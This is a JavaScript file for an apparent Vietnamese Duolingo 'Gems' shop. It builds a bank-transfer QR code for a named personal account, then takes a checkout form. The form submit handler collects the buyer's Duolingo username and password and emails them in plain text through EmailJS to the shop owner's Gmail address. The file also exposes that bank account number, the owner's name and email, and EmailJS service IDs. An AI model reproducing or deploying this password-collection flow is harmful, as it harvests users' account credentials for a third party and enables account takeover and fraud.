(function(){
    emailjs.init({
        publicKey: "VcJevCAmVgxVv0Fjw",
    });
})();

function showForm(gems, price) {
    document.getElementById('gems').value = gems;
    document.getElementById('price').value = price;

    const bankId = "MB";
    const accountNo = "701235";
    const accountName = "LE QUOC CHIEN";
    const addInfo = "Thanh toan don hang Gems";
    const qrCodeUrl = `https://img.vietqr.io/image/${bankId}-${accountNo}-compact.png?amount=${price}&addInfo=${encodeURIComponent(addInfo)}&accountName=${encodeURIComponent(accountName)}`;

    document.getElementById('qrCodeImage').src = qrCodeUrl;
    document.getElementById('checkoutForm').style.display = 'block';
    document.getElementById('checkoutForm').scrollIntoView({ behavior: 'smooth' });
}

function showPopup(title, message, type) {
    const popup = document.getElementById('popup');
    const overlay = document.getElementById('overlay');
    document.getElementById('popupTitle').textContent = title;
    document.getElementById('popupMessage').textContent = message;
    popup.className = `popup ${type}`;
    popup.style.display = 'block';
    overlay.style.display = 'block';
}

function closePopup() {
    document.getElementById('popup').style.display = 'none';
    document.getElementById('overlay').style.display = 'none';
}

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data = {
        gems: formData.get('gems'),
        price: formData.get('price'),
        userEmail: formData.get('userEmail'),
        duolingoUsername: formData.get('duolingoUsername'),
        duolingoPassword: formData.get('duolingoPassword')
    };

    emailjs.send("service_wbofi5a", "template_l175qks", {
        gems: data.gems,
        price: data.price.toLocaleString('vi-VN'),
        userEmail: data.userEmail,
        duolingoUsername: data.duolingoUsername,
        duolingoPassword: data.duolingoPassword
    })
    .then(() => {
        return emailjs.send("service_wbofi5a", "template_l175qks", {
            gems: data.gems,
            price: data.price.toLocaleString('vi-VN'),
            userEmail: data.userEmail,
            duolingoUsername: data.duolingoUsername,
            duolingoPassword: data.duolingoPassword,
            shopEmail: 'chienq895@gmail.com'
        });
    })
    .then(() => {
        showPopup('Thành công', `Đơn hàng ${data.gems} Gems đã được gửi đến ${data.userEmail}. Chủ shop (chienq895@gmail.com) cũng đã nhận được thông tin.`, 'success');
        setTimeout(() => {
            closePopup();
            document.getElementById('checkoutForm').style.display = 'none';
            document.getElementById('paymentForm').reset();
        }, 3000);
    })
    .catch(error => {
        console.error('Lỗi:', error);
        showPopup('Lỗi', 'Không thể xử lý đơn hàng. Vui lòng kiểm tra cấu hình EmailJS.', 'error');
    });
});
